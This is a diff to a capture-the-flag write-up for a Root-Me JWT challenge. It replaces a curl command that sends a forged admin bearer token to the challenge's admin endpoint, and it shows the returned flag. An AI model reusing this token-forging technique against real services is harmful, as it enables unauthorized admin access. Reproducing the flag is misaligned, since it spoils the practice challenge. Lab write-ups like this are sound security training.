@@ -43,12 +43,9 @@ Because of the challenge Descrption, I knew that I need to change the method to 
 So, let's find the flag thanks to a curl
 
 ```
- curl -X POST -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg"  http://challenge01.root-me.org/web-serveur/ch59/admin
-{"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"}
-                                                               
-┌──(h4ckrati㉿kali)-[~]
-└─$ 
+curl -X POST -H "Accept: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA"  http://challenge01.root-me.org/web-serveur/ch59/admin
 
+{"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"}
 ```
 
 
